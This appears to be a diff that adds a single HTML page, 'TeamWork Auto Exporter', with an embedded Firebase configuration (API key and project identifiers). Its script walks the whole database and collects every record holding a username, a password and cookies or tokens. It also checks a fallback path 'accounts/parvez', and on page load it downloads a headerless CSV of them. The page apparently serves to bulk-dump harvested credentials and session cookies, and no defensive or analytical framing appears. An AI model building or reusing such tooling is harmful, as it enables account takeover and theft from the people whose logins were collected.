@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>TeamWork Auto Exporter | Raw Data Only</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(145deg, #0a0f1e 0%, #0f172a 100%);
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .card {
+            background: rgba(30, 41, 59, 0.9);
+            backdrop-filter: blur(2px);
+            border-radius: 2rem;
+            padding: 2rem 1.8rem;
+            text-align: center;
+            max-width: 550px;
+            width: 100%;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(71, 85, 105, 0.4);
+            transition: all 0.2s;
+        }
+
+        h2 {
+            background: linear-gradient(135deg, #c084fc, #60a5fa);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            margin-bottom: 1.2rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            font-weight: 700;
+            font-size: 1.8rem;
+            letter-spacing: -0.3px;
+        }
+
+        .auto-download-btn {
+            background: linear-gradient(105deg, #2563eb, #1e40af);
+            border: none;
+            padding: 16px 28px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: white;
+            border-radius: 60px;
+            cursor: pointer;
+            width: 100%;
+            margin: 20px 0 12px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            transition: all 0.25s ease;
+            box-shadow: 0 10px 20px -5px rgba(37, 99, 235, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+
+        .auto-download-btn:hover {
+            transform: translateY(-2px);
+            background: linear-gradient(105deg, #3b82f6, #2563eb);
+            box-shadow: 0 18px 28px -8px rgba(37, 99, 235, 0.6);
+        }
+
+        .auto-download-btn:active {
+            transform: translateY(1px);
+        }
+
+        .status {
+            background: #0f172a;
+            padding: 1rem 1.2rem;
+            border-radius: 1.2rem;
+            color: #cbd5e1;
+            font-size: 0.9rem;
+            margin-top: 20px;
+            border-left: 4px solid #3b82f6;
+            text-align: left;
+            font-family: 'JetBrains Mono', monospace;
+            word-break: break-word;
+        }
+
+        .badge {
+            background: #1e293b;
+            color: #94a3b8;
+            padding: 5px 14px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 12px;
+            border: 1px solid #334155;
+        }
+
+        .fa, .fas, .far {
+            font-size: 1.1rem;
+        }
+
+        .loader {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.6s linear infinite;
+            margin-right: 6px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .footer-note {
+            font-size: 0.7rem;
+            color: #475569;
+            margin-top: 18px;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+<div class="card">
+    <h2>
+        <i class="fas fa-database" style="color: #60a5fa;"></i>
+        TEAMWORK EXPORTER
+    </h2>
+    <button class="auto-download-btn" id="exportBtn">
+        <i class="fas fa-file-csv"></i> EXPORT & DOWNLOAD CSV
+    </button>
+    <div class="status" id="statusMsg">
+        <i class="fas fa-sync-alt fa-fw"></i> Initializing secure connection...
+    </div>
+    <div class="badge">
+        <i class="fas fa-bolt"></i> Auto‑export on page load &nbsp;|&nbsp; 
+        <i class="fas fa-fire"></i> Firebase Realtime DB
+    </div>
+    <div class="footer-note">
+        📁 Direct account export — No headers, just username, password, cookies
+    </div>
+</div>
+
+<script>
+    // --------------------------------------------------------------
+    // 🔥 FIREBASE CONFIGURATION (teamwork-206ba)
+    // --------------------------------------------------------------
+    const firebaseConfig = {
+        apiKey: "AIzaSyDLh6Zg-K3ZZexLvLloRaR0F6Wr4ciHqAs",
+        authDomain: "teamwork-206ba.firebaseapp.com",
+        databaseURL: "https://teamwork-206ba-default-rtdb.firebaseio.com",
+        projectId: "teamwork-206ba",
+        storageBucket: "teamwork-206ba.firebasestorage.app",
+        messagingSenderId: "906293702680",
+        appId: "1:906293702680:web:bf8c2257e1e87964ded36d",
+        measurementId: "G-1KJRG83FK4"
+    };
+
+    // Initialize Firebase
+    let app;
+    try {
+        app = firebase.initializeApp(firebaseConfig);
+        console.log("✅ Firebase initialized: teamwork-206ba");
+    } catch (err) {
+        console.warn("Init error:", err);
+        app = firebase.app();
+    }
+    const database = firebase.database();
+
+    // Fetch all account entries recursively from ANY structure
+    async function fetchAllAccountEntries() {
+        const rootSnapshot = await database.ref('/').once('value');
+        const rootData = rootSnapshot.val();
+        if (!rootData) return [];
+        
+        const accountsArray = [];
+        
+        // Recursive traversal to find objects containing username+password
+        function traverse(node, path = "") {
+            if (!node || typeof node !== 'object') return;
+            
+            // Check if current node looks like an account object (has username/user + password/pass)
+            const hasUsername = (node.username !== undefined || node.user !== undefined);
+            const hasPassword = (node.password !== undefined || node.pass !== undefined);
+            
+            if (hasUsername && hasPassword) {
+                let usernameVal = node.username || node.user || "N/A";
+                let passwordVal = node.password || node.pass || "N/A";
+                let cookieVal = node.cookies || node.cookie || node.token || "";
+                accountsArray.push({
+                    username: String(usernameVal),
+                    password: String(passwordVal),
+                    cookies: String(cookieVal)
+                });
+            }
+            
+            // Continue traversing children
+            for (let key in node) {
+                if (node.hasOwnProperty(key) && typeof node[key] === 'object') {
+                    traverse(node[key], path + "/" + key);
+                }
+            }
+        }
+        
+        traverse(rootData);
+        
+        // Fallback: try specific path "accounts/parvez" if nothing found
+        if (accountsArray.length === 0) {
+            console.log("Scanning fallback path: accounts/parvez");
+            const legacySnapshot = await database.ref('accounts/parvez').once('value');
+            const parvezData = legacySnapshot.val();
+            if (parvezData && typeof parvezData === 'object') {
+                Object.values(parvezData).forEach((item) => {
+                    if (item && typeof item === 'object') {
+                        accountsArray.push({
+                            username: item.username || item.user || "N/A",
+                            password: item.password || item.pass || "N/A",
+                            cookies: item.cookies || item.cookie || ""
+                        });
+                    }
+                });
+            }
+        }
+        
+        // Remove duplicates (same username+password)
+        const uniqueMap = new Map();
+        for (const acc of accountsArray) {
+            const key = `${acc.username}|${acc.password}`;
+            if (!uniqueMap.has(key)) {
+                uniqueMap.set(key, acc);
+            }
+        }
+        return Array.from(uniqueMap.values());
+    }
+    
+    // Main export: CSV without ANY header row. Just raw data: col A = username, col B = password, col C = cookies
+    async function exportDataToCSV() {
+        const statusDiv = document.getElementById("statusMsg");
+        statusDiv.innerHTML = '<span class="loader"></span> Fetching data from TeamWork Firebase ...';
+        
+        try {
+            const accounts = await fetchAllAccountEntries();
+            
+            if (!accounts || accounts.length === 0) {
+                statusDiv.innerHTML = '⚠️ No account records found in database. <br> Make sure Firebase contains username/password/cookies data.';
+                return;
+            }
+            
+            // -----------------------------------------------
+            // 🔥 IMPORTANT: NO HEADER ROW AT ALL
+            // Directly each row: username, password, cookies
+            // No "Username,Password,Cookies" line
+            // -----------------------------------------------
+            const csvRows = [];
+            
+            for (const acc of accounts) {
+                // Escape double quotes by replacing " with ""
+                const safeUsername = acc.username.replace(/"/g, '""');
+                const safePassword = acc.password.replace(/"/g, '""');
+                const safeCookies = acc.cookies.replace(/"/g, '""');
+                
+                // Wrap each field in double quotes to handle commas and special characters properly
+                csvRows.push(`"${safeUsername}","${safePassword}","${safeCookies}"`);
+            }
+            
+            // Join rows with newline — NO header line
+            const csvContent = csvRows.join("\n");
+            
+            // Add UTF-8 BOM for special character support (optional but safe)
+            const blob = new Blob(["\uFEFF" + csvContent], { type: "text/csv;charset=utf-8;" });
+            const url = URL.createObjectURL(blob);
+            const link = document.createElement("a");
+            
+            // Generate filename with timestamp
+            const now = new Date();
+            const year = now.getFullYear();
+            const month = String(now.getMonth() + 1).padStart(2, '0');
+            const day = String(now.getDate()).padStart(2, '0');
+            const hours = String(now.getHours()).padStart(2, '0');
+            const minutes = String(now.getMinutes()).padStart(2, '0');
+            const seconds = String(now.getSeconds()).padStart(2, '0');
+            const dateStr = `${year}-${month}-${day}_${hours}-${minutes}-${seconds}`;
+            const fileName = `Teamwork_Accounts_${dateStr}.csv`;
+            
+            link.href = url;
+            link.download = fileName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
+            
+            statusDiv.innerHTML = `✅ <i class="fas fa-check-circle" style="color:#10b981;"></i> Export successful! <br> 📄 ${fileName} <br> 📊 Total accounts: ${accounts.length} <br> 🔗 No headers — Only raw account data (Username, Password, Cookies)`;
+            console.log(`✅ Exported ${accounts.length} accounts — no header row`);
+            
+        } catch (err) {
+            console.error("Export error:", err);
+            let errorMsg = err.message || "Unknown error";
+            if (err.code) errorMsg = `${err.code}: ${err.message}`;
+            statusDiv.innerHTML = `❌ Export failed: ${errorMsg} <br> ⚠️ Check Firebase rules or permissions.`;
+        }
+    }
+    
+    // Manual button click
+    const exportBtn = document.getElementById("exportBtn");
+    if (exportBtn) {
+        exportBtn.addEventListener("click", (e) => {
+            e.preventDefault();
+            exportDataToCSV();
+        });
+    }
+    
+    // ⭐ AUTO DOWNLOAD ON PAGE LOAD (no click needed)
+    window.addEventListener("DOMContentLoaded", () => {
+        setTimeout(() => {
+            exportDataToCSV().catch(e => {
+                console.warn("Auto-export error:", e);
+                const statusDiv = document.getElementById("statusMsg");
+                if (statusDiv) statusDiv.innerHTML = `⚠️ Auto export error: ${e.message}`;
+            });
+        }, 300);
+    });
+    
+    // Firebase connection monitor
+    database.ref('.info/connected').on('value', (snap) => {
+        if (snap.val() === true) {
+            console.log("🔥 Firebase connected: teamwork-206ba");
+        }
+    });
+</script>
+</body>
+</html>
